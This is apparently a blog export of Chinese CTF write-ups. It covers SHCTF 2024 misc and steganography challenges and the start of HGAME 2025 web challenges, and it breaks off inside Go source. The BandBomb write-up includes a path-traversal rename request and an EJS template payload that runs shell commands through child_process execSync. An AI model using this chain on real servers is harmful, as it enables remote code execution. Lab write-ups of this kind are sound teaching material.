<p>所以我们应该将chars改为熊曰论道所有可能出现的字符万能的互联网找不到熊曰论道会用什么字符，那我们就自己搓：随便整一大段字符放进去加密：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728538225327-be6734a4-f098-4cc5-874e-814b31e62d42.webp" alt="image.png"></p>
<p>文本去重<a href="https://www.qqxiuzi.cn/zh/quchong/">这里</a>，得到：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728538460886-c9b51996-1302-4ee1-b71f-d0fade10a501.webp" alt="image.png"></p>
<p>chars改为上述字符即可：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728538717884-1a06df5d-6c1a-495b-9e70-d0bff17d4255.webp" alt="image.png"></p>
<p>同时注意，因为这样的中文一个字符即占3byte，所以我们更改1byte解密脚本的字库进行破解运行：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728538802170-d360e791-d5bf-4cd3-8ca0-aeff8b35223c.webp" alt="image.png"></p>
<p>需要注意的是，因为解密顺序是名称顺序，所以各字符代表的是1，10，11…txt的内容手动更改顺序即可：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728538967642-32490d7a-56b7-41da-9d70-4fcb56691836.webp" alt="image.png"></p>
<p>输入并解密：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728539020798-d25bcabd-749b-4357-b7c4-22c26f66bccc.webp" alt="image.png"><br>
~~*关注塔菲谢谢喵<sub>*</sub>~</p>
<h2 id="·-拜师之旅②">· 拜师之旅②</h2>
<p>下载附件，解压查看，<s>我们就得到了flag</s><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728539477163-1a493d13-85cb-450a-9478-b73527f8c22a.png" alt="secret.png"></p>
<p>老规矩，先看属性：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728539531384-bb5db906-2dc1-4339-92d7-73f33c316cf1.webp" alt="image.png"></p>
<p>分辨率很低，数字很怪，文件又这么大，第一思路肯定是改宽高用010获取CRC：0x6FFE8F48<br>
整个脚本用CRC32验证一下宽高先：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728540089900-27340deb-034c-405a-846e-4f81f7ca0a05.webp" alt="image.png"></p>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728539954377-faaf5c28-0652-4b30-966a-175ab5797fc6.webp" alt="image.png"></p>
<p>没有问题，那下一个思路就是图片里藏文件了：<br>
010打开文件，发现有一个IDAT块没有填满：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728540216855-dbe67de0-d27d-4513-be14-94b165f4f3f0.webp" alt="image.png"></p>
<p>那就是藏了一张png了，把这一个及这之前的所有IDAT块删掉，保留文件头及IHDR，导出得到图片：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728639511974-d47d42b3-f9b0-4793-a5be-cd075fe27409.webp" alt="secret3.png"></p>
<p>得到真flag</p>
<h2 id="·-练假成真">· 练假成真</h2>
<p>题目附件是一张被部分遮挡的二维码图片<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728730951694-6ba01cac-a363-45a6-8aab-fc59cce86a8b.webp" alt="download.png"></p>
<p>因为是png，我们先按照png的思路来走一遍：<br>
010打开，发现文件尾部藏了一个png，掐头导出：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728739822489-a04b2741-505b-4baa-9a1c-e8cae2b1fff1.webp" alt="output.png"></p>
<p>是另一个二维码，扫描可以得到以下文本：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728739890002-aaa7732f-952d-4f51-b736-f3e93f2a631c.webp" alt="image.png"></p>
<p>看起来似乎有某种规律，分析一下：<br>
· 有很多连续的字符<br>
· 绝大多数字符都只出现过一次<br>
· 似乎是某些字符被调换了顺序<br>
· 排列顺序基本是大写字母-&gt;小写字母-&gt;数字-&gt;特殊符号据此我们可以写出这样的字符串：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728740275872-20527d02-2c0e-43d9-9bab-c164a7c886cc.webp" alt="image.png"></p>
<p>接着得到字符之间的对应替换关系：</p>
<p><code>V-&gt;N</code>	<code>N-&gt;R</code>	<code>R-&gt;V</code><br>
<code>F-&gt;h</code>	<code>h-&gt;p</code>	<code>p-&gt;F</code><br>
<code>h-&gt;y</code>		<code>y-&gt;H</code><br>
<code>0-&gt;G-&gt;0</code>		<code>2-&gt;1-&gt;2</code><br>
<code>9-&gt;Y-&gt;9</code>		<code>c-&gt;Z-&gt;c</code><br>
<code>z-&gt;T-&gt;z</code>		<code>j-&gt;E-&gt;j</code><br>
<code>S-&gt;M-&gt;S</code></p>
<p>不过即便我们归纳出了字符之间的关系，也无法得到任何有用的信息。思路中断，就应该搁置一边，回去审题，看有没有其他的信息和突破口：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728740907702-9b672b7b-d268-4c2e-8380-a820e9b6e0eb.webp" alt="image.png"></p>
<p>很明显没有什么用处，所以我们将目光转向那张损坏的二维码：前置知识：二维码的构成与阅读法二维码是存在着纠错机制的，所以即便某些信息缺失，我们也可以通过二维码的纠错码来恢复部分信息。纠错码的区域一般靠近二维码的左侧，所以这张二维码的遮挡主要是损坏了数据。先了解一下二维码的纠错特性：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728741504656-e083a9ef-46f7-45f2-a263-06577c17f395.webp" alt="cade0a55e21e0ba78dee1428d5615d3.jpg"></p>
<p>通过二维码工具QRazyBox<a href="https://merri.cx/qrazybox/">网页Demo</a>，可以获取到纠错等级为M,版本为3：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728741968912-052ef6f9-2393-47ea-ab42-a268baf45e0a.webp" alt="image.png"></p>
<p>这意味着我们可以在版本3，M纠错等级的二维码最多可存储的44字节数据中自动恢复13字节数据。<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728742621601-ba8b30a4-ef17-473a-96db-edc6395980ca.webp" alt="2a8d3a064cb6c253522daed5c5d4875.jpg"></p>
<p><em>划分了一下字节区域，数据有些错误，仅看分区</em>这怎么看都不像是只丢失了13字节的样子但是QR码的纠错使用了reed-solomon纠错码，只要我们知道二维码的数据损坏的位置，就可以大幅提升数据恢复的能力，最高可以提升到26字节所以我们的思路就确定了：读取二维码剩余的所有数据，确定损坏字节数，并尽可能人工修复一部分，然后利用纠错码恢复剩余数据先利用之前那个网站填充补齐码，去除掩码：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728743319629-34b86fad-23b7-4aa7-95cf-2b18badd3feb.webp" alt="屏幕截图 2024-10-12 222557.png"></p>
<p>掩码样式在上面可以获取到，为3，至于补齐码，是用来填充用不到的字节的，不存储数据接下来就可以手动提取二维码信息了：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728743535984-c28c4dce-5bc3-4f3a-a0ce-54d9c083bd2c.webp" alt="image.png"></p>
<p>从右下角第1，2字节处可以获取到这张二维码的编码类型为字节类型(0100),存储了(00011111)=31字节数据而这31字节数据中，我们有4字节完整的数据，额外附赠几比特散装数据这个时候我们缺失27字节数据，因为纠错码也有些丢失，我们需要多找出一些数据现在就要从存储的内容下手了，阅读二维码，得到以下信息：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728744309182-47ff3b7a-6906-4935-8351-fb8f32921109.webp" alt="image.png"></p>
<p>尝试解码一下未损坏的数据：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728744586641-b36f27d4-d1ea-45cc-a495-c10c3d07925f.webp" alt="image.png"><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728744591697-43877e91-c390-42cf-b483-ee196effc37f.webp" alt="image.png"></p>
<p>有没有想起什么？很明显是flag。这个平台的flag格式是什么？SHCTF{}。这个时候我们就可以假定数据的头部为SHCTF{，这样我们又白嫖了6个字节的数据，这样添加：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745190595-71355348-4887-4832-9c66-dc48a2ffdbb2.webp" alt="image.png"><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745222638-0237d6f1-661d-4f04-9e8b-52d6144e68a6.webp" alt="image.png"><br>
<em>01头也可以对的上**​</em>现在还缺失21字节的数据，理论上可以恢复数据了：使用python的reedsolo库进行修复，直接使用的其他人的脚本，改了一下错误：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745096823-0da0dc22-bbe7-4405-9418-9723439545d3.webp" alt="image.png"><br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745345131-c21c5d9a-53a2-4781-9668-a640a059ccf4.webp" alt="image.png"></p>
<p>把数据部分提取出来解密，得到：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745493123-b17fce35-85de-463b-9406-667a543b9eb1.webp" alt="image.png"></p>
<p><em>最后4位0000不要提取，是补位用的</em><br>
flag？提交一下就知道是一个fake flag了。里面的字符串看起来有点像Base64编码过的，解码一下，得到：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745692716-f1a434fc-a179-4b43-b805-73d50f83a6e0.webp" alt="image.png"></p>
<p>flag？它都告诉你它是一个fake flag了。这个时候读一下题，再看一下上面的Base64，是不是会感觉到有点熟悉？我们拿之前总结出的字符对应关系对照一下，可以发现全都有对应关系。转换一下，再拿Base64解码一下：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728745993007-17b9eeda-7de0-48ab-bc0e-37604cfeb56c.webp" alt="image.png"></p>
<p>flag？没错它就是flag。</p>
<h2 id="·-Schneider">· Schneider</h2>
<p><img src="/resources/images/SHCTF2024WriteUpassert/1728813327784-18235040-075a-4ff5-90e6-4e5a91226c4d.webp" alt="image.png"></p>
<p>如题，使用Schneider EcoStruxure Operator Terminal Expert打开：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728813386174-18f4da33-aada-4bfe-9b8a-2ed3b43d5c81.webp" alt="image.png"></p>
<p>点击Show Password即可得到flag：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1728813427966-fa2ee709-b923-45b7-bdb0-541354c65dc5.webp" alt="image.png"></p>
<h2 id="·-拜师之旅③">· 拜师之旅③</h2>
<p>下载后得到一张萝卜子png：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729404883242-0602247e-3ffd-4d09-9bda-ba1a7b9f4f3e.webp" alt="1.png"></p>
<p>010打开查看，png尾部藏了一个zip文件，掐头提取得到压缩包，但是被加密了使用stegsolve查看，发现原图存在lsb隐写：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729405165070-7365c93e-fc3c-4675-a558-e3157ec82533.webp" alt="image.png"></p>
<p>得到zip密码，解压后得到了另一张萝卜子png：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729405243541-cc1914b4-bdab-4ac1-9dc7-cfab3d3014aa.webp" alt="0107d803-db2e-4996-a7c7-95acbcdfb54d.png"></p>
<p>放大查看，有奇怪的小点点同时010打开，得知图片真实尺寸为320*180<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729405341768-9d7a00df-12f3-44e7-9163-f7e65ebca703.webp" alt="image.png"></p>
<p>那思路就是将小点点像素提取出来参考文章：<a href="https://www.cnblogs.com/cierra/p/17357133.html">链接</a>利用里面的脚本提取，得到flag:<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729405780591-431347b3-832e-47d7-aff8-53da65e32dfd.webp" alt="atri.png"></p>
<h2 id="·-今日无事，勾栏听曲">· 今日无事，勾栏听曲</h2>
<p>题目附件无后缀名，用010打开：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729940352613-b279dab6-87df-4ea8-a594-8c071137fa13.webp" alt="image.png"></p>
<p>分析文件内容，没有明显的文件头浏览文件，可以发现有大量重复的数据，可以分为两类：</p>
<ol>
<li class="lvl-3">
<p><code>00 00 04 08</code><br>
开头的数据</p>
</li>
<li class="lvl-3">
<p><code>00 00 01 10</code><br>
开头的数据整个文件其实就只有这两段数据重复出现，推测是用其表示了二进制的<code>0</code>和<code>1</code></p>
</li>
</ol>
<p>使用010的文本替换功能将<code>00 00 04 08</code>替换成<code>0</code>，<code>00 00 01 10</code>替换成<code>1</code></p>
<p>得到：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729940968047-71d82086-9877-4199-b24f-ba0b458f5816.webp" alt="image.png"></p>
<p><em>数据很大</em></p>
<p>转换为16进制，得到文件：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941080454-ade15095-ca32-43ed-948d-976e545963cf.webp" alt="image.png"></p>
<p>是个rar文件，内含flag.txt与draw.txt<br>
flag.txt是以明文存储的，很明显是fake flag<br>
关键在于draw.txt，但是winrar打开提示损坏：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941295715-1e9847f3-7175-475f-ba7a-0fda148c6448.webp" alt="image.png"></p>
<p>提示文件头损坏，检查文件头，发现：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941352329-77e47699-9448-4162-893e-3abcd93ea940.webp" alt="image.png"></p>
<p><code>7A</code>处错误，正常应该是<code>74</code>表示文件头，更改后打开得到draw.txt：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941521994-4016a26e-1dde-4c65-ba10-dc2a11c00dde.webp" alt="image.png"></p>
<p>每行长度相同，为1024，且有少数字符变化，猜测是点阵图：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941630567-6a29e428-82af-4686-8f8d-afb26fa219e1.webp" alt="image.png"></p>
<p>可以看到是一个塔，尖顶，带铁链，底下是一个带栏杆的平台,中间有拱状缺口…<br>
搜索得到大雁塔，符合特征：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941726096-6abed2ab-06d6-401a-81e6-c3e1f158a546.webp" alt="100w15000000xgcys4600.jpg"></p>
<p>转换md5，得到flag<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1729941810926-3fcca59e-f32b-4274-9b30-5a6ac22d57be.webp" alt="image.png"></p>
<h2 id="·-天命人">· 天命人</h2>
<p>题目里是一个抓usb接口的pcapng文件<br>
kali打开，获取HID Data：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1730010625449-ba6569ab-136a-48c9-989a-851935d08676.webp" alt="image.png"></p>
<p>利用某位出题人博客上的脚本<a href="https://j-0k3r.github.io/2024/04/26/ps5%E6%89%8B%E6%9F%84usb&amp;%E8%93%9D%E7%89%99%E6%B5%81%E9%87%8F%E5%8D%8F%E8%AE%AE/">这里</a>得到按键：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1730010982513-fac8ebf1-ed47-4c37-8a75-9330ce7d6c53.webp" alt="image.png"></p>
<p>按照规则整理：<br>
<img src="/resources/images/SHCTF2024WriteUpassert/1730011039926-1d95df75-68a0-4e37-bc06-b98114543cea.webp" alt="image.png"></p>
]]></content>
      <categories>
        <category>Articles</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME 2025 WriteUp</title>
    <url>/2025/02/10/HGAME%202025%20WriteUp/</url>
    <content><![CDATA[<h1>HGAME 2025 WriteUp</h1>
<hr>
<p>又是被各路大神暴打的一天 55555😭</p>
<hr>
<h2 id="Web">Web</h2>
<h3 id="Level-24-Pacman">Level 24 Pacman</h3>
<blockquote>
<p>你的目标是，在被他们抓住之前，收集一万枚金币，离开这个地方。</p>
<ol>
<li class="lvl-3">WASD或者上下左右均可以移动</li>
<li class="lvl-3">SPACE键可以暂停游戏</li>
<li class="lvl-3">你有五次机会。在此之前，努力逃吧！</li>
</ol>
</blockquote>
<p>前端题，题目提示 1 万分就可以获得 flag 。</p>
<p>代码审计，注意到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">_0x3c0cce[<span class="string">&#x27;createItem&#x27;</span>](&#123;</span><br><span class="line">            <span class="string">&#x27;x&#x27;</span>: _0x5e1765[<span class="string">&#x27;width&#x27;</span>] / <span class="number">0x2</span>,</span><br><span class="line">            <span class="string">&#x27;y&#x27;</span>: _0x5e1765[<span class="title function_">_0x4bff30</span>(<span class="number">0x14f</span>)] * <span class="number">0.5</span>,</span><br><span class="line">            <span class="string">&#x27;draw&#x27;</span>: <span class="keyword">function</span>(<span class="params">_0x413b57</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> _0x5dcc17 = _0x4bff30;</span><br><span class="line">                _0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0x159</span>)] = <span class="string">&#x27;#FFF&#x27;</span>,</span><br><span class="line">                _0x413b57[<span class="string">&#x27;font&#x27;</span>] = <span class="title function_">_0x5dcc17</span>(<span class="number">0x16a</span>),</span><br><span class="line">                _0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0x129</span>)] = <span class="title function_">_0x5dcc17</span>(<span class="number">0x154</span>),</span><br><span class="line">                _0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0x150</span>)] = <span class="title function_">_0x5dcc17</span>(<span class="number">0x101</span>);</span><br><span class="line">                <span class="keyword">var</span> _0x82b005 = _SCORE + <span class="number">0x32</span> * <span class="title class_">Math</span>[<span class="title function_">_0x5dcc17</span>(<span class="number">0x103</span>)](_LIFE - <span class="number">0x1</span>, <span class="number">0x0</span>);</span><br><span class="line">                _0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0x10c</span>)](<span class="title function_">_0x5dcc17</span>(<span class="number">0xf7</span>) + _0x82b005, <span class="variable language_">this</span>[<span class="string">&#x27;x&#x27;</span>], <span class="variable language_">this</span>[<span class="string">&#x27;y&#x27;</span>]),</span><br><span class="line">                _0x82b005 &gt; <span class="number">0x270f</span> ? (_0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0xf4</span>)] = <span class="title function_">_0x5dcc17</span>(<span class="number">0x164</span>),</span><br><span class="line">                _0x413b57[<span class="string">&#x27;fillText&#x27;</span>](<span class="title function_">_0x5dcc17</span>(<span class="number">0x10d</span>), <span class="variable language_">this</span>[<span class="string">&#x27;x&#x27;</span>], <span class="variable language_">this</span>[<span class="string">&#x27;y&#x27;</span>] + <span class="number">0x28</span>),</span><br><span class="line">                <span class="variable language_">console</span>[<span class="string">&#x27;log&#x27;</span>](<span class="title function_">_0x5dcc17</span>(<span class="number">0x10d</span>))) : (_0x413b57[<span class="title function_">_0x5dcc17</span>(<span class="number">0xf4</span>)] = <span class="title function_">_0x5dcc17</span>(<span class="number">0x164</span>),</span><br><span class="line">                _0x413b57[<span class="string">&#x27;fillText&#x27;</span>](<span class="string">&#x27;here is your gift:aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==&#x27;</span>, <span class="variable language_">this</span>[<span class="string">&#x27;x&#x27;</span>], <span class="variable language_">this</span>[<span class="string">&#x27;y&#x27;</span>] + <span class="number">0x28</span>),</span><br><span class="line">                <span class="variable language_">console</span>[<span class="title function_">_0x5dcc17</span>(<span class="number">0x125</span>)](<span class="title function_">_0x5dcc17</span>(<span class="number">0x166</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;),</span><br></pre></td></tr></table></figure>
<p>有两个可能的文本输出，下面那个是 Fake flag 。</p>
<p>打个断点改一下 _SCORE 的值然后送了即可拿到一段 base64：</p>
<p><img src="/resources/images/HGAME2025_WriteUp_assert/1.webp#img_half" alt=""></p>
<p>解码出来的字符串是乱的，将其对半分后逐字拼接即可得到最终 flag 。</p>
<h3 id="Level-47-BandBomb">Level 47 BandBomb</h3>
<p>题目给了源码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span class="line">      fs.<span class="title function_">mkdirSync</span>(uploadDir);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, uploadDir);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">filename</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">cb</span>(<span class="literal">null</span>, file.<span class="property">originalname</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; </span><br><span class="line">  <span class="attr">storage</span>: storage,</span><br><span class="line">  <span class="attr">fileFilter</span>: <span class="function">(<span class="params">_, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (!file.<span class="property">originalname</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;无效的文件名&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="title function_">cb</span>(<span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;文件处理错误&#x27;</span>), <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> uploadsDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadsDir)) &#123;</span><br><span class="line">    fs.<span class="title function_">mkdirSync</span>(uploadsDir);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">readdir</span>(uploadsDir, <span class="function">(<span class="params">err, files</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: [] &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;mortis&#x27;</span>, &#123; <span class="attr">files</span>: files &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/upload&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  upload.<span class="title function_">single</span>(<span class="string">&#x27;file&#x27;</span>)(req, res, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">file</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27;没有选择文件&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; </span><br><span class="line">      <span class="attr">message</span>: <span class="string">&#x27;文件上传成功&#x27;</span>,</span><br><span class="line">      <span class="attr">filename</span>: req.<span class="property">file</span>.<span class="property">filename</span> </span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/rename&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; oldName, newName &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">const</span> oldPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, oldName);</span><br><span class="line">  <span class="keyword">const</span> newPath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;uploads&#x27;</span>, newName);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!oldName || !newName) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.<span class="title function_">rename</span>(oldPath, newPath, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">json</span>(&#123; <span class="attr">error</span>: <span class="string">&#x27; &#x27;</span> + err.<span class="property">message</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123; <span class="attr">message</span>: <span class="string">&#x27; &#x27;</span> &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`服务器运行在 http://localhost:<span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>容易观察到 <code>/rename</code> 路由存在漏洞，可以实现文件移动</p>
<p>同时注意到 <code>app.set('view engine', 'ejs');</code></p>
<p>上传一个 ejs 文件将主页的 <code>motris.ejs</code> 替换掉即可。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/rename</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node1.hgame.vidar.club:32580</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;oldName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.ejs&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;newName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../views/mortis.ejs&quot;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%- process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;env|grep hgame&#x27;).toString() %&gt;</span><br></pre></td></tr></table></figure>
<p><code>hgame&#123;avE_muj1c@-HAS_brOK3n_Up_buT-W3-hAVE_um1t@kl4d&#125;</code></p>
<h3 id="Level-69-MysteryMessageBoard">Level 69 MysteryMessageBoard</h3>
<p>源码：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/chromedp/chromedp&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	store = sessions.NewCookieStore([]<span class="type">byte</span>(<span class="string">&quot;fake_key&quot;</span>))</span><br><span class="line">	users = <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">string</span>&#123;</span><br><span class="line">		<span class="string">&quot;shallot&quot;</span>: <span class="string">&quot;fake_password&quot;</span>,</span><br><span class="line">		<span class="string">&quot;admin&quot;</span>:   <span class="string">&quot;fake_password&quot;</span>&#125;</span><br><span class="line">	comments []<span class="type">string</span></span><br><span class="line">	flag     = <span class="string">&quot;FLAG&#123;this_is_a_fake_flag&#125;&quot;</span></span><br><span 